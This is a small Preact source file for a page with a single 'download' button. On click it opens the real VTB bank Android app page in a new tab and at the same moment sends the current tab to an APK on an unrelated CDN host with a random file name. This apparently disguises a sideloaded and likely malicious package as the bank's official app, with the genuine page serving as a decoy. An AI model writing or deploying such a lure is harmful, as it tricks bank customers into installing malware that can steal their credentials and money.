import { render } from 'preact';
import './style.css';

export function App() {
	const download = () => {
		window.open(
			"https://www.vtb.ru/personal/online-servisy/vtb-online-android/",
			"_blank"
		);
		window.location.href = "https://trafficsharkou.b-cdn.net/SA_B4585hsz.apk";
	};

	return <button onClick={download}>download</button>;
}


render(<App />, document.getElementById('app'));
